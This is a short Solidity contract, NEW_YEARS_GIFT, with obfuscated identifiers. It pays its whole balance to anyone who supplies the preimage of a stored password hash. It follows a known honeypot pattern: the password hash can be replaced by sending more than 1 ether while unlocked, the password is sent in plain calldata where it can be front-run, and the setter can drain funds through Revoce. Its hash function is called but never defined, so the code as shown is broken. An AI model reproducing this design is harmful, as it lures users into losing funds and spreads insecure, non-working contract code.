// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0x5cea27;

    bool _0x75d149 = false;

    address sender;

    bytes32 public _0x977628;

    function() public payable{}

    function GetHash(bytes _0x24fa7f) public constant returns (bytes32) {return _0xb8d27b(_0x24fa7f);}

    function SetPass(bytes32 _0xb90f35)
    public
    payable
    {
        if( (!_0x75d149&&(msg.value > 1 ether)) || _0x977628==0x0 )
        {
            _0x977628 = _0xb90f35;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0x6e29a2)
    public
    {
        if(msg.sender==sender)
        {
            _0x5cea27 =_0x6e29a2;
        }
    }

    function GetGift(bytes _0x24fa7f)
    external
    payable
    returns (string)
    {
        if(_0x977628 == _0xb8d27b(_0x24fa7f))
        {
            msg.sender.transfer(this.balance);
            return _0x5cea27;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0x5cea27="";
        }
    }

    function PassHasBeenSet(bytes32 _0xb90f35)
    public
    {
        if(msg.sender==sender&&_0xb90f35==_0x977628)
        {
           _0x75d149=true;
        }
    }
}